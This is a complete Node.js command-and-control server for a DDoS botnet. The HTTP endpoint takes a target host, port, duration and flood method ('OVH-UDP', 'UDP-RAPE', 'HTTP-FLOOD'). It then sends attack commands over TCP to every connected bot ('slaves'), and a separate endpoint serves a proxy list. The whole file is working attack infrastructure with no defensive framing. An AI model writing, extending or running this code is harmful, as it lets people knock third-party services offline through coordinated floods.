const net = require("net")
const express = require("express")
const chalk = require("chalk")
const Joi = require("joi")
const chalkGradient = require("gradient-string")
const chalkAnimation = require("chalk-animation")
const terminalLink = require("terminal-link")
const fs = require("fs")
const app = express()

const HTTP_PORT = 3000
const SOCKET_PORT = 7777
const SOCKET_HOST = "0.0.0.0"

/*************
 *  METHODS  *
 ************/

const METHODS = ["OVH-UDP", "UDP-RAPE", "HTTP-FLOOD"]

var clients = []

const validateAttack = (data = {}) => {
    const schema = Joi.object({
        host: Joi.string().min(4).required(),
        port: Joi.number().min(0).required(),
        time: Joi.number().min(1).positive().required(),
        method: Joi.string()
            .min(1)
            .uppercase()
            .valid(...METHODS)
            .required(),
        header: Joi.string().min(4),
    })
    return schema.validate(data)
}

const sendAttack = (method, host, port, time, header = undefined) => {
    for (let client of clients) {
        let writeString = `ATT|${method}|${host}|${port}|${time}`
        if (header) writeString += `|${header}`
        client.write(writeString)
    }
}

console.log(
    chalk.italic(
        chalkGradient.fruit(
            "\n\n\n\n                                                      Loading...\n\n\n\n"
        )
    )
)

app.get("/", (req, res) => {
    const { error } = validateAttack(req.query)
    if (error) return res.status(400).send(error.details[0].message)
    let { host, port, time, method, header } = req.query
    method = method.toUpperCase()

    if (!METHODS.includes(method))
        return res.status(404).send("method does not exist")
    sendAttack(method, host, port, time, header)
    return res.send(`attack sent to ${clients.length} slaves.`)
})

app.get("/proxies", (req, res) => {
    try {
        const data = fs.readFileSync("proxies.txt")
        res.send(data)
    } catch {
        res.send("")
    }
})

var server = net.createServer(function (socket) {
    const onLeave = () => {
        console.log(
            chalk.grey(
                `[${chalk.redBright("-")}] ${chalkGradient.rainbow(
                    `${socket.remoteAddress}:${socket.remotePort}`
                )} disconnected.`
            )
        )
        clients = clients.filter((client) => client !== socket)
    }

    socket.on("data", (data) => {
        console.log("Received: " + data)
        const dataStr = data.toString()
        if (dataStr === "servConn") {
            console.log(
                chalk.grey(
                    `[${chalk.greenBright("+")}] ${chalkGradient.rainbow(
                        `${socket.remoteAddress}:${socket.remotePort}`
                    )} connected.`
                )
            )
            clients.push(socket)
        }
    })
    socket.on("end", onLeave)

    socket.on("error", onLeave)
})

server.listen(SOCKET_PORT, SOCKET_HOST, () => {
    console.log(
        `${chalk.grey(
            `[${chalkGradient.retro(
                `SOCKET`
            )}] Listening on port ${chalk.magentaBright(SOCKET_PORT)}.`
        )}`
    )
})

app.listen(HTTP_PORT, () => {
    const link = terminalLink("[OPEN]", `http://localhost:${HTTP_PORT}`)
    console.log(
        `${chalk.grey(
            `[${chalkGradient.retro(
                `API`
            )}] Listening on port ${chalk.magentaBright(HTTP_PORT)}. ${link}`
        )}`
    )
})
